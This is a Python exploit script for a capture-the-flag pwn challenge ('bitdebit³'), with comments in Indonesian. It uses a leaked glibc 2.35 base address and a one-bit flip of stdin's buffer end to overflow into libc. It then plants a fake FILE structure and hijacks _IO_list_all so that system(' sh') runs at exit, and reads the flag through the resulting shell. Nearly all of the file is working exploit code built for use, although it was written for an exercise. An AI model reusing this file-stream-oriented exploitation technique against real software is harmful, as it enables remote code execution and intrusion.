#!/usr/bin/env python3
import os
import re
import socket
import ssl
import struct
import subprocess
import sys
import time
import select
from pathlib import Path

BASE_DIR = Path(__file__).resolve().parent
BIN = BASE_DIR / "bitdebit³_patched"
LD = BASE_DIR / "ld-2.35.so"
DEFAULT_HOST = "bitdebit3-chal-ed99e3e34bc6016d.challs.ctf.thefewchosen.com"
DEFAULT_PORT = 1337

# libc 2.35 offsets dari libc.so.6 challenge
STDIN = 0x21aaa0
STDIN_BUF_END = STDIN + 0x40
OVERFLOW_START = STDIN + 0x83

IO_LIST_ALL = 0x21b680
IO_WFILE_JUMPS = 0x2170c0
IO_FILE_JUMPS = 0x217600
SYSTEM = 0x50d70

REAL_STDIN_LOCK = 0x21ca80
REAL_STDIN_WIDE = 0x21ab80


def p64(x):
    return struct.pack("<Q", x & 0xffffffffffffffff)


class Tube:
    def __init__(self, host=None, port=None):
        self.sock = None
        self.proc = None

        if host is None:
            self.proc = subprocess.Popen(
                [str(LD), "--library-path", str(BASE_DIR), str(BIN)],
                cwd=BASE_DIR,
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
            )
        else:
            raw_sock = socket.create_connection((host, int(port)), timeout=8)
            tls_ctx = ssl.create_default_context()
            tls_ctx.check_hostname = False
            tls_ctx.verify_mode = ssl.CERT_NONE
            self.sock = tls_ctx.wrap_socket(raw_sock, server_hostname=host)
            self.sock.settimeout(0.2)

    def fileno(self):
        if self.sock:
            return self.sock.fileno()
        return self.proc.stdout.fileno()

    def send(self, data):
        if self.sock:
            self.sock.sendall(data)
        else:
            self.proc.stdin.write(data)
            self.proc.stdin.flush()

    def sendline(self, data):
        self.send(data + b"\n")

    def recv_some(self, timeout=0.5):
        end = time.time() + timeout
        out = b""

        while time.time() < end:
            r, _, _ = select.select([self.fileno()], [], [], 0.05)
            if not r:
                continue

            try:
                if self.sock:
                    chunk = self.sock.recv(4096)
                else:
                    chunk = os.read(self.fileno(), 4096)
            except (BlockingIOError, socket.timeout):
                continue

            if not chunk:
                break

            out += chunk

            if len(chunk) < 4096:
                break

        return out

    def recvuntil(self, marker, timeout=8):
        end = time.time() + timeout
        out = b""

        while marker not in out and time.time() < end:
            out += self.recv_some(0.2)

        if marker not in out:
            raise TimeoutError(f"timeout waiting for {marker!r}; got {out!r}")

        return out

    def close(self):
        try:
            if self.sock:
                self.sock.close()
            elif self.proc:
                self.proc.kill()
        except Exception:
            pass


def choose_positive_size_bit(libc_base):
    """
    Flip 1 bit di stdin->_IO_buf_end.

    Targetnya bikin _IO_buf_end jauh lebih besar dari _IO_buf_base,
    supaya fgets() berikutnya overflow dari stdin->_shortbuf ke area libc.
    """
    end_ptr = libc_base + STDIN_BUF_END
    need_end = libc_base + OVERFLOW_START + 0x3000

    for byte_off in range(2, 6):
        val = (end_ptr >> (8 * byte_off)) & 0xff

        for bit in range(8):
            if ((val >> bit) & 1) == 0:
                new_end = end_ptr + (1 << (8 * byte_off + bit))

                if new_end >= need_end:
                    return end_ptr + byte_off, bit, val, val ^ (1 << bit)

    raise RuntimeError("no safe bit flip found")


def build_payload(libc_base):
    fake = libc_base + OVERFLOW_START
    wide = fake + 0x200
    fake_wide_vtable = fake + 0x380
    fake_lock = fake + 0x500

    payload = bytearray(0xC00)

    def put_rel(off, data):
        payload[off:off + len(data)] = data

    def put_abs(abs_off, data):
        off = abs_off - OVERFLOW_START

        if off < 0 or off + len(data) > len(payload):
            raise ValueError(f"offset out of payload: {hex(abs_off)}")

        put_rel(off, data)

    # Nanti system(fp) membaca awal fake FILE sebagai command.
    # Pakai spasi di depan supaya flags FILE masih aman.
    put_rel(0x00, b" sh\x00")

    # Stabilkan stdin asli biar fgets/unlock tidak crash sebelum exit.
    put_abs(STDIN + 0x88, p64(libc_base + REAL_STDIN_LOCK))
    put_abs(STDIN + 0x90, p64(0xffffffffffffffff))
    put_abs(STDIN + 0x98, p64(0))
    put_abs(STDIN + 0xA0, p64(libc_base + REAL_STDIN_WIDE))

    for off in (0xA8, 0xB0, 0xB8, 0xC0, 0xC8, 0xD0):
        put_abs(STDIN + off, p64(0))

    put_abs(STDIN + 0xD8, p64(libc_base + IO_FILE_JUMPS))

    # Fake FILE buat FSOP.
    put_rel(0x68, p64(0))                      # fake->_chain = NULL
    put_rel(0x88, p64(fake_lock))              # fake->_lock
    put_rel(0xA0, p64(wide))                   # fake->_wide_data
    put_rel(0xC0, struct.pack("<I", 1))        # fake->_mode > 0
    put_rel(0xD8, p64(libc_base + IO_WFILE_JUMPS))

    # Fake wide_data supaya _IO_wfile_overflow() lanjut ke _IO_wdoallocbuf().
    wide_rel = wide - fake
    put_rel(wide_rel + 0x18, p64(0))           # _wide_write_base
    put_rel(wide_rel + 0x20, p64(1))           # _wide_write_ptr > base
    put_rel(wide_rel + 0x30, p64(0))           # _wide_buf_base == NULL
    put_rel(wide_rel + 0xE0, p64(fake_wide_vtable))

    # _IO_wdoallocbuf(): call [wide_vtable + 0x68](fp)
    put_rel((fake_wide_vtable - fake) + 0x68, p64(libc_base + SYSTEM))

    # Global list diarahkan ke fake FILE.
    put_abs(IO_LIST_ALL, p64(fake))

    return bytes(payload)


def solve(host=None, port=None):
    io = Tube(host, port)

    try:
        banner = io.recvuntil(b"first addr")
        sys.stdout.buffer.write(banner)
        sys.stdout.flush()

        m = re.search(rb"libc base: (0x[0-9a-fA-F]+)", banner)
        if not m:
            raise RuntimeError("libc base leak not found")

        libc_base = int(m.group(1), 16)

        flip_addr, flip_bit, old_byte, new_byte = choose_positive_size_bit(libc_base)

        print(f"[+] libc base : {hex(libc_base)}")
        print(f"[+] flip addr : {hex(flip_addr)}")
        print(f"[+] flip bit  : {flip_bit} ({old_byte:#x} -> {new_byte:#x})")

        io.sendline(str(flip_addr).encode())

        sys.stdout.buffer.write(io.recvuntil(b"first bit"))
        sys.stdout.flush()

        io.sendline(str(flip_bit).encode())

        sys.stdout.buffer.write(io.recvuntil(b"What was your name?"))
        sys.stdout.flush()

        payload = build_payload(libc_base)
        print(f"[+] payload len: {len(payload)}")

        io.send(payload + b"\n")

        # Tunggu output terakhir dari program sebelum mengirim command ke
        # shell. Kalau command dikirim terlalu cepat, read() besar yang
        # dipicu oleh bit flip dapat ikut memakannya sebagai bagian payload.
        before_shell = io.recvuntil(b"See you around traveler", timeout=8)
        sys.stdout.buffer.write(before_shell)
        sys.stdout.flush()

        # FSOP menjalankan `system(" sh")` saat exit cleanup.
        io.send(b"cat flag 2>/dev/null; cat /flag 2>/dev/null; exit\n")
        data = io.recv_some(4.0)
        sys.stdout.buffer.write(data)
        sys.stdout.flush()

        flags = re.findall(rb"[A-Za-z0-9_]+\{[^}\r\n]+\}", data)

        if flags:
            print(f"\n<FLAG>{flags[-1].decode(errors='replace')}</FLAG>")
        else:
            print("\n[!] flag regex tidak ketemu, cek raw output di atas")

    finally:
        io.close()


def main():
    if len(sys.argv) == 1 or sys.argv[1] == "--local":
        solve()
    elif len(sys.argv) == 3:
        solve(sys.argv[1], int(sys.argv[2]))
    elif len(sys.argv) == 2 and sys.argv[1] == "--remote":
        solve(DEFAULT_HOST, DEFAULT_PORT)
    else:
        print(f"usage: {sys.argv[0]} [HOST PORT]")
        print(f"       {sys.argv[0]} --remote")
        print(f"       {sys.argv[0]} --local")
        raise SystemExit(1)


if __name__ == "__main__":
    main()
